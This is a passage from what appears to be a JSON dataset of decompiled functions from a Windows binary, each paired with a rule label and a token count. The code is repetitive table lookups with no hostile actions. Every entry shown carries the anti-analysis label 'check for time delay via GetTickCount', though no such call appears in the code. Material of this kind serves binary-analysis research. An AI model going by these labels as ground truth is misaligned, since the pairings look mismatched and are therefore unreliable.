fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4375
    },
    "1400b352": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3520(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb410);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb420);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106020, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106060, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4220
    },
    "1400b358": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3580(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb420);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106020, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106060, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106100, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106120, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106140, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106160, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106180, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return 